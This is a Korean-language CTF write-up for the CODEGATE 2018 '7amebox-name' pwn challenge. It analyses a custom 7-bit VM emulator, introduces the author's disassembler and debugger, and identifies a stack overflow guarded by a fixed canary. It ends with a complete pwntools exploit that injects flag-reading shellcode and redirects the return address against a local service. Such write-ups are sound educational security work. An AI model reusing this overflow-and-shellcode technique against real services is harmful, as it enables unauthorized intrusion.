---
title: "[HS2024] [CODEGATE 2018] 7amebox-name Write-up"
date: 2024-08-01 19:00:00 +0900
categories: [WRITE-UP, PWN]
tags: [hs2024, codegate, ctf, pwn, 7amebox, vm]     # TAG names should always be lowercase
---

# 7amebox-name Write-up

2018 Codegate 예선 문제인 7amebox-name 문제 write-up.

개발한 도구(disassembler, debugger 포함) 다운로드: [7amebox_tools.tar](/assets/files/posts/HS2024-1/7amebox-name/7amebox_tools.tar)

## 1. Environment
- Ubuntu 16.04
- Python 2.7
```
.
├── Dockerfile
├── _7amebox_patched.py
├── flag
├── mic_check.firm
├── run.sh
└── vm_name.py
```

## 2. Emulator 분석
`_7amebox_patched.py` 는 firmware를 emulating해준다.
7amebox에서 emulating하는 데이터의 1 word는 3byte이고, 1byte는 7bit이다.

### 2.1. Syscalls

7amebox에는 총 7개의 syscall들이 정의돼있고 내용은 아래와 같다.

| syscall | instruction | return |
| --- | --- | --- |
| s0()  | exit(0) | None |
| s1(r1) | r0 = open(file) | None |
| s2(r1, r2, r3) | write(fd, buf, size) | size or 0 (fail) |
| s3(r1, r2, r3) | read(fd, buf, size) | length |
| s4(r1, r2) | alloc | 1 or 0 |
| s5(r0) | random(21) | random number |
| s6(r0) | free | None |

### 2.2. instructions
총 31개의 assembly instruction들이 정의돼있으며, 내용은 아래와 같다.

```python
op_list = {
    'op_x0': 'load',
    'op_x1': 'load7',
    'op_x2': 'store',
    'op_x3': 'store7',
    'op_x4': 'mov',
    'op_x5': 'xchg',
    'op_x6': 'push',
    'op_x7': 'pop',
    'op_x8': 'syscall',
    'op_x9': 'add',
    'op_x10': 'add7',
    'op_x11': 'sub',
    'op_x12': 'sub7',
    'op_x13': 'shr',
    'op_x14': 'shl',
    'op_x15': 'mul',
    'op_x16': 'div',
    'op_x17': 'inc',
    'op_x18': 'dec',
    'op_x19': 'and',
    'op_x20': 'or',
    'op_x21': 'xor',
    'op_x22': 'mod',
    'op_x23': 'cmp',
    'op_x24': 'cmp7',
    'op_x25': 'jg',
    'op_x26': 'jl',
    'op_x27': 'je',
    'op_x28': 'jne',
    'op_x29': 'jmp',
    'op_x30': 'call',
}
```

### 2.3. Tooling - disassembler

위에서 분석한 instruction들과 기타 byte 구조 등을 종합해서 disassembler를 만들었다.

```python
#!/usr/bin/python2.7
from tools.disassembler import Disassembler

firmware = 'mic_check.firm'

Disassembler(emulator=None, firmware=firmware).disas_all()
```

위와 같이 실행하면 아래와 같이 firmware의 bytecode를 분석해서 assembly 형태로 뽑을 수 있다.

![mydisassembler](/assets/img/posts/HS2024-1/7amebox-name/my_disassembler.png){:width="80%"}

개발한 도구는 본 페이지 최상단에서 다운로드 할 수 있다.

### 2.4. Tooling - debugger

gdb와 같은 역할을 수행해줄 debugger를 작성하고, 아래와 같이 9가지 명령어를 만들어 분석했다.

```python
{
    'r': self.restart,
    'ni': self.next_instruction,
    'b': self.set_breakpoint,
    'd': self.remove_breakpoint,
    'c': self.run_until_breakpoint,
    'x': self.memdump,
    'set': self.set_memory,
    'reg': self.info_register,
    'q': exit,
}
```

```python
#!/usr/bin/python2.7
from tools.debugger import Debugger

firmware = 'mic_check.firm'

debugger = Debugger(firmware)
debugger.run()
```

위와 같이 실행하면 아래와 같이 debugging이 가능하다.

<div style="display: flex; justify-content: space-between;">
    <img src="/assets/img/posts/HS2024-1/7amebox-name/mydebugger_1.png" style="width: 80%;" alt="debugger_1">
    <img src="/assets/img/posts/HS2024-1/7amebox-name/mydebugger_2.png" style="width: 80%;" alt="debugger_2">
</div>

개발한 도구는 본 페이지 최상단에서 다운로드 할 수 있다.

## 3. 바이너리 / 취약점 분석

### 3.1. Stack Buffer Overflow

`main`함수를 disassemble 해서 보면 아래와같이 0x42길이만큼 read하는것을 확인 할 수 있다.

```
    0x002a : 12 10 42 00 00  | mov      r1, 0x42
    0x002f : 10 5b           | mov      r5, bp
    0x0031 : 2e 50 3c 00 00  | sub      r5, 0x3c
    0x0036 : 10 05           | mov      r0, r5
    0x0038 : 7b 50 23 00 00  | call     pc, 0x23      # read
```

함수 프롤로그를 보면 stack size는 0x3c이므로 버퍼 오버플로우가 발생한다.

```
    0x000d : 2f 40 3c 00 00  | sub      sp, 0x3c
    0x0012 : 10 5b           | mov      r5, bp
    0x0014 : 2e 50 03 00 00  | sub      r5, 0x3
    0x0019 : 12 60 45 04 46  | mov      r6, 0x12345
    0x001e : 08 65           | store    r6, r5
    0x0020 : 12 00 4d 00 01  | mov      r0, 0xcd
```

단, 카나리와 비슷하게 `bp-3`에 `0x12345`라는 값이 있어야 한다.
```
    0x0050 : 5e 60 45 04 46  | cmp      r6, 0x12345
    0x0055 : 73 50 2b 7f 7f  | jne      pc, -0x55     # exit
```

## 4. Exploit 전략

Exploit을 하기 위한 전략.

1. 본 문제에는 NX가 없으므로 간단히 open, read, write하는 shellcode를 올리고 실행한다.


## 5. Result

exploit을 수행한 결과 아래와 같이 shell을 획득할 수 있다.

![exploit success](/assets/img/posts/HS2024-1/7amebox-tiny_adventure/exploit_success.png)

### Full exploit code

```python
from tools.utils import *

from pwn import *


context.log_level = 'INFO'
context.arch = 'x86_64'

HOST, PORT = '127.0.0.1 8102'.split(' ')

if __name__ == '__main__':
    p = remote(HOST, PORT)

    payload = b''
    # open('flag')
    '''
    12 10 50 3d 3f  | mov r1, 0xf5fd0
    12 00 01 00 00  | mov r0, 0x1
    20 00           | syscall
    '''
    payload += b'\x12\x10\x50\x3d\x3f'
    payload += b'\x12\x00\x01\x00\x00'
    payload += b'\x20\x00'
    # read(2, bp, 0x28)
    '''
    12 30 28 00 00  | mov r3, 0x28
    10 2b           | mov r2, bp
    12 10 02 00 00  | mov r1, 2
    12 00 03 00 00  | mov r0, 0x3
    20 00           | syscall
    '''
    payload += b'\x12\x30\x28\x00\x00'
    payload += b'\x10\x2b'
    payload += b'\x12\x10\x02\x00\x00'
    payload += b'\x12\x00\x03\x00\x00'
    payload += b'\x20\x00'
    # write(1, bp, 0x28)
    '''
    12 30 28 00 00  | mov r3, 0x28
    10 2b           | mov r2, bp
    12 10 01 00 00  | mov r1, 1
    12 00 02 00 00  | mov r0, 0x2
    20 00           | syscall
    '''
    payload += b'\x12\x30\x28\x00\x00'
    payload += b'\x10\x2b'
    payload += b'\x12\x10\x01\x00\x00'
    payload += b'\x12\x00\x02\x00\x00'
    payload += b'\x20\x00'

    payload += b'flag'
    payload = payload.ljust(0x39, b'\x00')

    payload += encode_seven(0x12345)  # canary 0x12345

    payload += encode_seven(0xf4000)  # SFP
    payload += encode_seven(0xf5f9e)
    
    p.sendafter(b'name>', payload)
    p.interactive()

```